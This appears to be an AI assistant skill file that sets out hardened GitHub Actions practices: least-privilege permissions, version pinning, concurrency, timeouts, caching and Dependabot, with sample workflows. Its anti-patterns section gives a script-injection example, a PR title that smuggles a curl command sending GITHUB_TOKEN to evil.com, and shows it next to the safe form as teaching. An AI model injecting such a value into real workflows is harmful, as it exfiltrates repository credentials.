---
name: github-actions-hardened
description: Generate production-hardened GitHub Actions CI/CD workflows enforcing least-privilege permissions, concurrency groups, timeout guards, dependency caching, and latest major version action tags. Use this skill — not github-actions-templates — whenever the user asks for "hardened", "secure", "production-ready", or "compliant" workflows, mentions security audits, or when quality and reliability matter. Always co-generates a .github/dependabot.yml. Trigger for any GitHub Actions request where quality or security posture matters.
---

# GitHub Actions Hardened Workflows

You are acting as a Staff DevOps Engineer. Every workflow you generate must enforce all five hardening principles below — no exceptions, no shortcuts.

## When to Use This Skill

Prefer this skill over `github-actions-templates` when:
- The project will ship to production or is externally visible
- Security audits, SOC 2, or compliance are in scope
- The user asks for "hardened", "secure", or "production-ready" workflows
- Any third-party action is involved (which is almost always)

For quick throwaway prototypes or purely internal scripts, `github-actions-templates` is fine.

---

## Five Hardening Principles

These aren't arbitrary rules — each addresses a real class of incident.

### 1. Job-Level Least-Privilege Permissions

GitHub Actions grants the `GITHUB_TOKEN` broad permissions by default. If a step in your workflow is compromised (e.g., a malicious `npm postinstall` script), it can use that token to push code, create releases, or exfiltrate secrets.

Set `permissions` explicitly **at the job level** (not the workflow level) so that each job gets only what it needs:

```yaml
jobs:
  test:
    permissions:
      contents: read       # checkout
```

Common permission scopes:
- `contents: read` — checkout code
- `contents: write` — create releases, push tags
- `packages: write` — push to GHCR
- `id-token: write` — OIDC token for cloud auth or SLSA provenance
- `pull-requests: write` — post PR comments
- `checks: write` — post check run results
- `security-events: write` — upload SARIF to Security tab

Never use `permissions: write-all`. Never omit `permissions` entirely on a job that uses `GITHUB_TOKEN`.

### 2. Latest Major Version Action Tags

Always pin actions to their latest **major version tag** (e.g., `@v4`). Never use `@latest`, `@main`, or `@master` — these are moving targets that can introduce breaking changes or security regressions without warning.

```yaml
# Too loose — can break without warning
- uses: actions/checkout@latest
- uses: actions/checkout@main

# Correct — stable within the major version contract
- uses: actions/checkout@v4
- uses: actions/setup-node@v4
```

Before writing any workflow, look up the current latest major version for each action you plan to use:
- **With web/search access:** search `github.com/<owner>/<repo>/releases` for the latest tag
- **With `gh` CLI:** `gh api repos/<owner>/<repo>/releases/latest --jq .tag_name`
- **Without either:** use the most recent major version you know confidently — do NOT guess minor/patch numbers. If uncertain, note it explicitly so the user can verify.

Dependabot (see below) will keep these tags current automatically, ensuring you receive security patches within the major version without any manual effort.

### 3. Concurrency Groups

Without concurrency controls, every push to a PR branch queues a new run while the previous one is still in progress. The old run produces stale results, wastes runner minutes, and can cause race conditions in deployments.

Add this to every workflow:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
```

The condition `github.ref != 'refs/heads/main'` is important: cancel redundant runs on PR branches, but never cancel a run that is already deploying to production.

### 4. Timeout Guards

GitHub's default job timeout is 360 minutes (6 hours). A test suite that hangs on network I/O, a Docker build stuck waiting for a layer, or a deployment waiting for a lock will consume 6 hours of runner minutes per occurrence — and on private repos, this directly costs money.

Always set `timeout-minutes` on every job:

```yaml
jobs:
  test:
    timeout-minutes: 15    # fail fast if tests hang
  build:
    timeout-minutes: 30    # Docker builds may be slow
  deploy:
    timeout-minutes: 20    # include time for rollout checks
```

Choose values that are 2–3× your typical run time, not the absolute maximum.

### 5. Native Dependency Caching

Re-downloading all dependencies on every run is the single largest source of avoidable latency in most CI pipelines. Use the `cache` parameter built into setup actions when available:

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: '20'
    cache: 'npm'          # or 'yarn' or 'pnpm'
```

For ecosystems without built-in cache support, use `actions/cache` with a meaningful key.

---

## Supplementary Best Practices

### Path Filtering

Avoid triggering workflows when irrelevant files change. This is the simplest way to reduce wasted CI minutes.

```yaml
on:
  push:
    branches: [main]
    paths:
      - 'src/**'
      - 'package*.json'
    paths-ignore:
      - '**.md'
      - 'docs/**'
  pull_request:
    branches: [main]
    paths:
      - 'src/**'
      - 'package*.json'
    paths-ignore:
      - '**.md'
      - 'docs/**'
```

**Note:** If `paths` and `paths-ignore` both match the same file, `paths-ignore` wins. For documentation-only repos, omit path filtering entirely.

---

## Hardened Workflow Patterns

### Pattern A: CI Test Workflow (Node.js)

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

jobs:
  test:
    name: Test (Node ${{ matrix.node-version }})
    runs-on: ubuntu-latest
    timeout-minutes: 15

    permissions:
      contents: read

    strategy:
      fail-fast: false
      matrix:
        node-version: ['20', '22']

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Lint
        run: npm run lint

      - name: Test
        run: npm test -- --coverage

      - name: Upload coverage
        if: matrix.node-version == '20'
        uses: codecov/codecov-action@v5
        with:
          fail_ci_if_error: true
```

**For pnpm:** change `cache: 'npm'` to `cache: 'pnpm'` and add `pnpm/action-setup@v4` before setup-node with `corepack enable`. **For yarn:** change `cache: 'npm'` to `cache: 'yarn'`.

---

### Pattern B: Docker Build and Push to GHCR

```yaml
# .github/workflows/docker.yml
name: Docker Build and Push

on:
  push:
    branches: [main]
    tags: ['v*']
  pull_request:
    branches: [main]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build:
    name: Build and Push
    runs-on: ubuntu-latest
    timeout-minutes: 30

    permissions:
      contents: read
      packages: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to GHCR
        if: github.event_name != 'pull_request'
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha,prefix=sha-

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: ${{ github.event_name != 'pull_request' }}
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

---

### Pattern C: Tagged Release

```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    tags: ['v*.*.*']

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false   # Never cancel an in-flight release

jobs:
  release:
    name: Create Release
    runs-on: ubuntu-latest
    timeout-minutes: 20

    permissions:
      contents: write     # create GitHub Release

    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0    # needed for changelog generation

      - name: Build
        run: |
          # Replace with your actual build command
          npm ci && npm run build

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          generate_release_notes: true
          files: dist/**
```

---

## Dependabot Configuration

Always co-generate this file alongside any workflow you create. Dependabot will automatically open PRs to update action versions when new major/minor/patch releases ship.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    # Group all action updates into a single PR to reduce noise
    groups:
      github-actions:
        patterns:
          - "*"
    commit-message:
      prefix: "chore(ci)"
    labels:
      - "dependencies"
      - "ci"
```

For extended variants (with reviewers, ignore patterns, multiple ecosystems), see `references/dependabot-config.md`.

---

## Ecosystem Adaptation

Adapt Pattern A's Node.js CI to other ecosystems:

| Ecosystem | Setup Action | Cache Approach | Install | Test |
|-----------|-------------|----------------|---------|------|
| Python | `actions/setup-python@v5` | `cache: 'pip'` | `pip install -r requirements.txt` | `pytest` |
| Go | `actions/setup-go@v5` | `cache: true` (built-in) | implicit | `go test ./...` |
| Rust | `dtolnay/rust-toolchain@stable` | `actions/cache@v4` on `~/.cargo` + `./target` | implicit | `cargo test` |
| Java/Maven | `actions/setup-java@v4` | `cache: 'maven'` | `mvn -B install -DskipTests` | `mvn test` |
| Java/Gradle | `actions/setup-java@v4` | `cache: 'gradle'` | `./gradlew dependencies` | `./gradlew test` |

---

## Common Anti-Patterns

**`permissions: write-all`** — Grants every possible scope. A compromised step could push malicious commits or delete releases. Always enumerate only what each job needs.

**`uses: action/foo@latest` or `@main`** — Moving targets that can silently introduce breaking changes or security regressions. Always pin to a major version tag.

**No `concurrency` block** — Queues redundant runs and produces stale status checks on PRs.

**No `timeout-minutes`** — Allows a hung job to consume 6 hours of runner capacity per occurrence.

**Separate `actions/cache` step when the setup action has a `cache:` parameter** — Redundant and error-prone. Use the built-in parameter where available.

**Script injection via direct `${{ }}` interpolation in `run:` blocks** — User-controlled values injected directly into shell commands allow an attacker to execute arbitrary code. Always pass untrusted input through environment variables.

Contexts that are attacker-controllable and must never be interpolated directly into `run:`:
- `github.event.issue.title` / `.body`
- `github.event.pull_request.title` / `.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.head_ref` (PR branch name — can be set by the PR author)

```yaml
# DANGEROUS — attacker can set PR title to: "; curl https://evil.com?t=$GITHUB_TOKEN; echo "
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# SAFE — shell treats the variable as data, not code
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

For deployment workflows using cloud credentials, see `references/security-practices.md` for OIDC setup (preferred over long-lived secrets).
